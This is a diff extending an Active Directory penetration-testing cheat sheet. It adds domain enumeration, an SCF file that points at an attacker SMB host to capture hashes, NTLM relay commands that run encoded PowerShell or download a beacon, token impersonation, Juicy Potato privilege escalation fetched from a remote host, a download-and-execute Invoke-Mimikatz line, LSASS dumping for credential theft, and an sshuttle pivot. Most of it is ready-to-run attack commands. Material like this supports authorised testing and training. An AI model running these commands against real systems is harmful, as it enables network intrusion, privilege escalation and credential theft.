@@ -25,9 +25,10 @@ net groups /domain
 net groups /domain "Domain Admins"
 
 Get-ADUser
+Get-Domain
 Get-DomainUser
 Get-DomainGroup
-Get-Domain
+Get-DomainGroupMember -identity "Domain Admins" -Domain m0chanAD.local -DomainController 10.10.14.10
 netdiscover -r subnet/24
 ```
 
@@ -348,11 +349,60 @@ Shout out to hausec for this super nice tip.
 
 
 
+SCF File Attack
+
+```
+Create .scf file and drop inside SMB Share and fire up Responder ;) 
+
+
+Filename = @m0chan.scf
+[Shell]
+Command=2
+IconFile=\\10.10.14.2\Share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+
+
+
+
 SMB Relay
 
 
 
 NTLM-Relay
+
+```
+Good article explaining differences between NTLM/Net-NTLMV1&V2
+
+https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
+
+TL;DR NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing.
+
+You CAN perform Pass-The-Hash attacks with NTLM hashes.
+You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes.
+
+PS: You CANNOT relay a hash back to itself.
+
+crackmapexec smb 10.10.14.0/24 --gene-relay-list targets.txt
+
+This will tell you a list of hosts within a subnet which do not have SMB Signing enabled.
+
+python Responder.py -I <interface> -r -d -w
+ntlmrelayx.py -tf targets.txt (By default this will dump the local SAM of the targets, not very useful?)
+
+How about we execute a command instead.
+
+ntlmrelayx.py -tf targets.txt -c powershell.exe -Enc asdasdasdasd
+ntlmrelayx.py -tf targets.txt -c powershell.exe /c download and execute beacon... = RIP
+
+
+
+You could also couple this with SQLi but executing EXEC xp_cmdshell '' and relaying the response or pop a shell on the web server etc.
+```
+
+
 
 
 
@@ -670,6 +720,8 @@ https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1
 Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
 Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"
 
+Can also use incognito from meterpreter to steal access/delegation tokens and impersonate users. (Requires Admin/SYSTEM Privs)
+
 #Tokenvator https://github.com/0xbadjuju/Tokenvator
 
 Reflectively Load it with Powershell, Cobalt, SilentTrinity etc...
@@ -689,6 +741,20 @@ $parameters=@("arg1", "arg2")
 Juicy Potato
 
 ```
+#Requires SeImpersonatePrivilege (Typically found on service accounts IIS Service, SQL Service etc)
+
+#Reference https://ohpe.it/juicy-potato/
+
+(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5:8000/JuicyPotato.exe','C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\Backup\JuicyPotato.exe')
+
+JuicyPotato.exe -l 1337 -p C:\Users\Public\Documents\Mochan.exe -t * -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}
+
+Mochan.exe = Payload
+5B3E6773-3A99-4A3D-8096-7765DD11785C = Target CLISD
+
+Can also use -A flag to specify arguments alongside cmd.exe/powershell.exe etc
+
+JUICY POTATO HAS TO BE RAN FROM CMD SHELL AND NOT POWERSHELL
 
 ```
 
@@ -778,7 +844,22 @@ reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
 Dump Creds
 
 ```
+(new-object System.Net.WebClient).DownloadString('http://10.10.14.5:8000/Invoke-Mimikatz.ps1');Invoke-Mimikatz 
 
+Can also run Mimikatz.exe after some AV Evasion removing strings etc. ippSec has a great tutorial on this.
+
+mimikatz.exe
+privlege::debug
+sekurlsa::logonPasswords full
+
+The safer method is to dump the process memory of LSASS.exe with MiniDump 
+(https://github.com/3xpl01tc0d3r/Minidump)
+
+and send the .bin to Mimikatz locally.
+
+sekurlsa::minidump C:\users\m0chan\lssas.dmp
+
+Can also be used for dumping and pass the ticket attacks but will cover this elsewhere.
 ```
 
 
@@ -806,9 +887,23 @@ Decrypt EFS Files with Mimikatz if Admin/System
 
 
 
+## [](#header-2)Persistance
 
 
-[](#header-2)Lateral Movement
+
+SSH Shuttle
+
+```
+./run -r root@10.10.110.123 172.16.1.0/24 -e "ssh -i Root.key"
+```
+
+
+
+
+
+## [](#header-2)Lateral Movement
+
+
 
 Plink
 
